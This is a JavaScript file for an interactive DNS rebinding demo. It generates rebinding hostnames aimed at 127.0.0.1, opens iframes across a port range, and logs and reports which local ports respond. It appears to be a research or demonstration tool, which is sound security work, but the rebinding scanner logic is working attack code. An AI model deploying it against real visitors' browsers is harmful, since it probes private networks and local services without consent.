// query params override these
// note, they'll be strings if they're overridden
var defaults = {
  id: null,
  low: 1336,
  high: 1338,
  iframeFailTimeout: 15000,
  addFrameInterval: 100,
  bustDomains: 0,
  httpstate: 1,
  hitCount: 3,
  auto: false,
  interactive: 1
}

// These params get passed on to sub-frame
// either handled by javascript or the gocode (e.g. in the template)
var captureParams = [
  'maxTries',
  'retryPause',
  'connectionTimeout',
  'prefetchHead',
  'noConnectionClose',
  'noXDNSPrefetchControl',
  'noCacheControl',
  'prefetchCount',
  'interactive'
]

/// /

function MakeRebindName (index, unique, ip1, ip2, httpstate) {
  var ip2Fixed = ip2.replace(/\./g, 'x')
  var uid = unique + 'u' + index
  var items = ['uid', uid, 'ip2', ip2Fixed]
  if (httpstate !== 0) {
    items.push('httpstate')
    items.push(httpstate)
  }
  return items.join('-') + '.dconf.rebindmy.zone'
}

function MakeFrame (hostname, port, settings) {
  var res = document.createElement('iframe')
  res.dataset.port = port
  var query = ''
  captureParams.forEach(function (x) {
    if (settings.hasOwnProperty(x)) { query += x + '=' + encodeURIComponent(settings[x]) + '&' }
  })
  res.setAttribute('src', 'http://' + hostname + ':' + port + '/?' + query)
  res.style.display = 'block'
  res.style.width = '100%'
  res.style.height = '20em'
  res.style.border = '0.5em solid red'
  return res
}

function MakeCacheBuster (uniq, num) {
  var div = document.createElement('div')
  div.id = uniq + '.' + num
  for (var i = 0; i < num; i++) {
    var img = document.createElement('img')
    img.src = 'http://' + uniq + '.' + i + '.buster.example.com'
    div.appendChild(img)
  }
  return div
}

function WaitClick (s) {
  var b = document.getElementById('nextbtn')
  if (s === null) { b.remove() }
  b.disabled = false
  return new Promise(function (resolve, reject) {
    b.innerText = s
    b.onclick = function () { b.disabled = true; resolve() }
  })
}

function TestRunner (targetip, settings, serverSettings) {
  this.settings = settings
  this.ip1 = serverSettings.CaptureIP
  this.ip2 = targetip

  this.testStatus = {}
  this.testStatus['id'] = settings.id
  this.testStatus['status'] = 'init'
  this.testStatus['results'] = {}
  this.testStatus.requests = 0

  this.countPending = 0
  this.countDone = 0

  this.unique = settings.id == null ? (new Date().getTime() % 10000000) : settings.id.replace(/[^a-zA-Z0-9-]/g, '')
  this.unique = ('' + this.unique).substring(0, 8)
  this.i = settings.low | 0
  this.limit = settings.high | 0
  this.totalLength = this.limit - this.i
}

TestRunner.prototype.setStatus = function (o) {
  if (this.settings.id === null) return

  var s = JSON.stringify(o)
  var r = new window.XMLHttpRequest()
  r.open('POST', '/record?id=' + this.settings.id)
  r.send(s)
}

TestRunner.prototype.updateProgress = function () {
  document.getElementById('reqcount').innerText = this.testStatus.requests
  var p = document.getElementById('progressDone')
  p.style.width = (100 * (this.countDone / this.totalLength)).toFixed(2) + '%'
  p = document.getElementById('progressPending')
  p.style.width = (100 * (this.countPending / this.totalLength)).toFixed(2) + '%'
}

TestRunner.prototype.logResult = function (msg, port) {
  this.testStatus.requests += msg.tries
  document.getElementById('results').innerText += '\nPort ' + port + ' is ' + msg.code
  this.countPending -= 1
  this.countDone += 1

  this.updateProgress()

  this.testStatus.results[port] = msg

  if (msg.code !== 'closed') {
    var row = document.createElement('tr')
    var td = document.createElement('td')
    td.innerText = port
    var td2 = document.createElement('td')
    td2.innerText = msg.code
    row.appendChild(td); row.appendChild(td2)
    document.getElementById('results-tbody').appendChild(row)
  }

  if (this.countPending === 0) {
    this.testStatus.status = 'done'
    this.testStatus.done = +new Date()
    this.setStatus(this.testStatus)
    document.getElementById('state').innerText = 'Done.'
  }
}

TestRunner.prototype.addFrame = function () {
  var st = MakeFrame(MakeRebindName(this.i, this.unique, this.ip1, this.ip2, this.settings.httpstate | 0), this.i, this.settings)
  document.getElementById('frames').appendChild(st)
  this.updateProgress()
  this.i += 1
}

TestRunner.prototype.startScan = function () {
  this.start = new Date()
  this.testStatus['start'] = +this.start
  this.setStatus(this.testStatus)
  var that = this

  var j = 0

  window.addEventListener('message', function (event) {
    var frames = document.getElementsByTagName('iframe')
    for (var i = 0; i < frames.length; i++) {
      if (frames[i].contentWindow === event.source) {
        if (event.data.type === 'start') { frames[i].dataset.loaded = '1'; return }
        if (event.data.type === 'ping') {
          j++
          WaitClick('Make Request').then(function () { frames[i].contentWindow.postMessage('pong', '*'); MakeCacheBuster(that.unique + '-' + j, that.settings.bustDomains) })
          return
        }
        that.logResult(event.data, frames[i].dataset.port, frames[i])
        if (that.i < that.settings.high) {
          WaitClick('Remove Frame').then(function () { frames[i].remove(); return WaitClick('Open iframe on port ' + that.i) }).then(function () { that.addFrame() })
        } else {
          WaitClick(null)
        }
        break
      }
    }
  }, false)

  WaitClick('Open iframe on port ' + that.i).then(function () {
    that.addFrame()
  })
}

/// /

// https://stackoverflow.com/a/21210643
var queryDict = {}
// window.location.search.substr(1).split('&').forEach(function (item) { queryDict[item.split('=')[0]] = item.split('=')[1] })

var querySettings = Object.assign({}, defaults, queryDict)

var oReq = new window.XMLHttpRequest()
oReq.addEventListener('load', function (r) {
  var serverSettings = JSON.parse(this.responseText)
  var scanner = new TestRunner('127.0.0.1', querySettings, serverSettings)

  WaitClick('Start Demo').then(function () {
    scanner.startScan()
  })
})
oReq.open('GET', '/server-settings.json')
oReq.send()
